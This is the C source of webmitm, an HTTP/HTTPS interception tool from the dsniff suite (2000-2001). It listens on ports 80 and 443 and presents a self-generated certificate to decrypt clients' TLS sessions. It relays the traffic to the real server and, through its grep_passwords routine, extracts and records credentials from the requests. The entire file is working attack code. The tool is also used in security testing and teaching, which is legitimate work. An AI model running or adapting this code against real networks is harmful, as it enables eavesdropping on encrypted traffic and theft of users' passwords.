/*
 * webmitm.c
 *
 * HTTP / HTTPS monkey-in-the-middle.
 *
 * Copyright (c) 2000 Dug Song <dugsong@monkey.org>
 *
 * $Id: webmitm.c,v 1.11 2001/03/17 08:35:05 dugsong Exp $
 */

#include "config.h"

#include <sys/param.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#include <err.h>
#include <errno.h>
#include <libnet.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "buf.h"
#include "record.h"
#include "version.h"

#define CERT_FILE	"webmitm.crt"

int	 Opt_quiet = 0;
int	 Opt_debug = 0;
int	 Opt_read = 0;
int	 Opt_write = 0;
int	 Opt_dns = 1;

int	 http_fd, https_fd;
int	 client_fd, server_fd;
SSL_CTX	*ssl_client_ctx, *ssl_server_ctx;
SSL	*ssl_client, *ssl_server;
struct	 sockaddr_in csin, ssin;
int	 do_ssl, sig_pipe[2];
in_addr_t	static_host = 0;

extern int decode_http(char *, int, char *, int);

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: webmitm [-d] [host]\n");
	exit(1);
}

static void
sig_chld(int signal)
{
	if (write(sig_pipe[1], "x", 1) < 0)
		warn("sig_chld");
	
}

static void
sig_int(int signal)
{
	close(http_fd);
	close(https_fd);
	record_close();
	exit(0);
}

static void
reap_child(void)
{
	pid_t pid, status;
	
	while ((pid = waitpid(-1, &status, WNOHANG)) > 0) {
		if (Opt_debug)
			warnx("child %d terminated with status %d",
			      pid, status);
	}
}

static void
err_ssl(int eval, char *msg)
{
	char buf[128];

	ERR_error_string(ERR_get_error(), buf);
	err(eval, "%s", buf);
}

static void
grep_passwords(char *buf, int len)
{
	char obuf[1024];
	
	if ((len = decode_http(buf, len, obuf, sizeof(obuf))) > 0) {
		record(csin.sin_addr.s_addr, ssin.sin_addr.s_addr,
		       IPPROTO_TCP, ntohs(csin.sin_port), ntohs(ssin.sin_port),
		       "http", obuf, len);
	}
}

static void
cert_init(void)
{
	struct stat sb;

	/* XXX - i am cheap and dirty */
	
	if (stat(CERT_FILE, &sb) < 0) {
		if (system("openssl genrsa -out " CERT_FILE " 1024") != 0)
			err(1, "system");
		if (system("openssl req -new -key " CERT_FILE " -out "
			   CERT_FILE ".csr") != 0)
			err(1, "system");
		if (system("openssl x509 -req -days 365 -in " CERT_FILE ".csr"
			   " -signkey " CERT_FILE " -out " CERT_FILE ".new"))
			err(1, "system");
		if (system("cat " CERT_FILE ".new >> " CERT_FILE) != 0)
			err(1, "system");
		
		unlink(CERT_FILE ".new");
		unlink(CERT_FILE ".csr");
		
		warnx("certificate generated");
	}
}

static void
client_init(void)
{
	if (fcntl(client_fd, F_SETFL, 0) < 0)
		err(1, "fcntl");
	
	if (do_ssl) {
		ssl_client = SSL_new(ssl_client_ctx);
		SSL_set_fd(ssl_client, client_fd);
		
		if (SSL_accept(ssl_client) == 0)
			err_ssl(1, "SSL_accept");
	}
}

static int
client_read(char *buf, int size)
{
	if (do_ssl) {
		return (SSL_read(ssl_client, buf, size));
	}
	return (read(client_fd, buf, size));
}

static int
client_request(char *buf, int size)
{
	struct buf *b, req;
	char *p;
	int i, reqlen;

	memset(&req, 0, sizeof(req));
	req.base = buf;
	req.size = size;
	reqlen = 0;
	
	/* XXX - i feel cheap and dirty */
	while ((i = client_read(req.base + req.end, req.size - req.end)) > 0) {
		req.end += i;

		if (reqlen && buf_len(&req) >= reqlen) {
			break;
		}
		else if ((i = buf_index(&req, "\r\n\r\n", 4)) > 0) {
			reqlen = i + 4;
			b = buf_tok(&req, NULL, reqlen);
			buf_rewind(&req);

			if ((i = buf_index(b, "\r\nContent-length: ", 18)) < 0)
				break;
			
			buf_skip(b, i + 18);
			b = buf_getword(b, "\r\n", 2);
			p = buf_strdup(b); buf_free(b);
			reqlen += atoi(p); free(p);
		}
	}
	reqlen = buf_len(&req);
	
	return (reqlen);
}

static int
client_write(char *buf, int size)
{
	if (do_ssl) {
		return (SSL_write(ssl_client, buf, size));
	}
	return (write(client_fd, buf, size));
}

static void
client_close(void)
{
	if (do_ssl) {
		SSL_free(ssl_client);
	}
	close(client_fd);
}

static void
server_init(char *buf, int size)
{
	struct buf *word, msg;
	char *vhost;
	int i;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = do_ssl ? htons(443) : htons(80);

	if (static_host == 0) {
		buf_init(&msg, buf, size);
		
		if ((i = buf_index(&msg, "\r\nHost: ", 8)) > 0) {
			buf_skip(&msg, i + 8);
			word = buf_tok(&msg, "\r\n", 2);
			vhost = buf_strdup(word);
		}
		else {
			i = buf_index(&msg, " http://", 8);
			
			if (i < 0 || i > 8) {
				errx(1, "no virtual host in request");
			}
			buf_skip(&msg, i + 8);
			word = buf_tok(&msg, "/", 1);
			vhost = buf_strdup(word);
		}
		ssin.sin_addr.s_addr = libnet_name2addr4(NULL, vhost, 1);
		free(vhost);
		
		if (ssin.sin_addr.s_addr == ntohl(INADDR_LOOPBACK) ||
		    ssin.sin_addr.s_addr == -1) {
			errx(1, "couldn't resolve host in request");
		}
	}
	else ssin.sin_addr.s_addr = static_host;
	
	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		err(1, "socket");

	if (connect(server_fd, (struct sockaddr *)&ssin, sizeof(ssin)) < 0)
		err(1, "connect");
	
	if (do_ssl) {
		ssl_server_ctx = SSL_CTX_new(SSLv23_client_method());
		ssl_server = SSL_new(ssl_server_ctx);
		SSL_set_connect_state(ssl_server);

		SSL_set_fd(ssl_server, server_fd);
		
		if (SSL_connect(ssl_server) < 0)
			err_ssl(1, "SSL_connect");
	}
}

static int
server_read(char *buf, int size)
{
	if (do_ssl) {
		return (SSL_read(ssl_server, buf, size));
	}
	return (read(server_fd, buf, size));
}

static int
server_write(char *buf, int size)
{
	if (do_ssl) {
		return (SSL_write(ssl_server, buf, size));
	}
	return (write(server_fd, buf, size));
}

static void
server_close(void)
{
	if (do_ssl) {
		SSL_free(ssl_server);
	}
	close(server_fd);
}

static void
mitm_init(void)
{
	struct sockaddr_in sin;
	int i = 1;

	if (pipe(sig_pipe) < 0)
		err(1, "pipe");

	if ((http_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ||
	    (https_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		err(1, "socket");
	
	if (setsockopt(http_fd, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i)) < 0 ||
	    setsockopt(https_fd, SOL_SOCKET, SO_REUSEADDR, &i, sizeof(i)) < 0)
		err(1, "setsockopt");
	
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = INADDR_ANY;

	sin.sin_port = htons(80);
	if (bind(http_fd, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		err(1, "bind");

	sin.sin_port = htons(443);
	if (bind(https_fd, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		err(1, "bind");

	if (listen(http_fd, 3) < 0 || listen(https_fd, 3) < 0)
		err(1, "listen");

	SSL_library_init();
	SSL_load_error_strings();
	
	ssl_client_ctx = SSL_CTX_new(SSLv23_server_method());

	if (SSL_CTX_use_certificate_file(ssl_client_ctx, CERT_FILE,
					 SSL_FILETYPE_PEM) == 0)
		err_ssl(1, "SSL_CTX_use_certificate_file");
	
	if (SSL_CTX_use_PrivateKey_file(ssl_client_ctx, CERT_FILE,
					SSL_FILETYPE_PEM) == 0)
		err_ssl(1, "SSL_CTX_use_PrivateKey_file");
	
	if (SSL_CTX_check_private_key(ssl_client_ctx) == 0)
		err_ssl(1, "SSL_CTX_check_private_key");
}

static void
mitm_child(void)
{
	u_char buf[8192];
	fd_set fds;
	int i;
	
	if (Opt_debug)
		warnx("new connection from %s.%d",
		      inet_ntoa(csin.sin_addr), ntohs(csin.sin_port));

	client_init();
	
	if ((i = client_request(buf, sizeof(buf))) < 0)
		err(1, "client_request");

	if (Opt_debug)
		warnx("%d bytes from %s", i, inet_ntoa(csin.sin_addr));
	
	if (Opt_debug > 1)
		write(STDERR_FILENO, buf, i);
	
	server_init(buf, i);
	
	if (server_write(buf, i) != i)
		err(1, "server_write");
	
	if (!Opt_quiet)
		grep_passwords(buf, i);
	
	for (;;) {
		FD_ZERO(&fds);
		FD_SET(client_fd, &fds);
		FD_SET(server_fd, &fds);
		
		i = MAX(client_fd, server_fd) + 1;
		if (select(i, &fds, 0, 0, 0) < 0) {
			if (errno != EINTR)
				break;
		}
		if (FD_ISSET(client_fd, &fds)) {
			i = sizeof(buf);
			if ((i = client_request(buf, i)) <= 0)
				break;
			
			if (Opt_debug)
				warnx("%d bytes from %s",
				      i, inet_ntoa(csin.sin_addr));

			if (Opt_debug > 1)
				write(STDERR_FILENO, buf, i);
			
			if (server_write(buf, i) != i)
				break;
			
			if (!Opt_quiet)
				grep_passwords(buf, i);
		}
		else if (FD_ISSET(server_fd, &fds)) {
			i = sizeof(buf);
			if ((i = server_read(buf, i)) <= 0)
				break;

			if (Opt_debug)
				warnx("%d bytes from %s",
				      i, inet_ntoa(ssin.sin_addr));

			if (Opt_debug > 2)
				write(STDERR_FILENO, buf, i);
			
			if (client_write(buf, i) != i)
				break;
		}
		else err(1, "select");
	}
	server_close();
	client_close();
}

static void
mitm_run(void)
{
	fd_set fds;
	int i;

	signal(SIGCHLD, sig_chld);
	signal(SIGINT, sig_int);

	if (fcntl(sig_pipe[0], F_SETFL, O_NONBLOCK) < 0 ||
	    fcntl(sig_pipe[1], F_SETFL, O_NONBLOCK) < 0)
		err(1, "fcntl");
	
	if (fcntl(http_fd, F_SETFL, O_NONBLOCK) < 0 ||
	    fcntl(https_fd, F_SETFL, O_NONBLOCK) < 0)
		err(1, "fcntl");
	
	for (;;) {
		FD_ZERO(&fds);
		
		FD_SET(http_fd, &fds);
		FD_SET(https_fd, &fds);
		FD_SET(sig_pipe[0], &fds);

		i = MAX(http_fd, https_fd);
		i = MAX(sig_pipe[0], i);
		
		if (select(i + 1, &fds, 0, 0, 0) < 0) {
			if (errno != EINTR)
				err(1, "select");
		}
		i = sizeof(csin);
		
		if (FD_ISSET(sig_pipe[0], &fds)) {
			while (read(sig_pipe[0], &i, 1) == 1)
				; /* empty non-blocking pipe */
			
			reap_child();
			continue;
		}
		if (FD_ISSET(http_fd, &fds)) {
			client_fd = accept(http_fd, (struct sockaddr *)&csin, &i);
			do_ssl = 0;
		}
		else if (FD_ISSET(https_fd, &fds)) {
			client_fd = accept(https_fd, (struct sockaddr *)&csin, &i);
			do_ssl = 1;
		}
		else errx(1, "select failure");
		
		if (client_fd < 0) {
			if (errno != EINTR && errno != EWOULDBLOCK)
				err(1, "accept");
		}
		if (fork() == 0) {
			close(http_fd);

			mitm_child();
			
			exit(0);
		}
		close(client_fd);
	}
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	int c;

	while ((c = getopt(argc, argv, "dh?V")) != -1) {
		switch (c) {
		case 'd':
			Opt_debug++;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;

	if (argc == 1) {
		if ((static_host = libnet_name2addr4(NULL, argv[0], 1)) == -1)
			usage();
	}
	else if (argc != 0) usage();
	
	record_init(NULL);

	cert_init();
	
	mitm_init();

	if (static_host == 0) {
		warnx("relaying transparently");
	}
	else warnx("relaying to %s", argv[0]);
	
	mitm_run();

	exit(0);
}
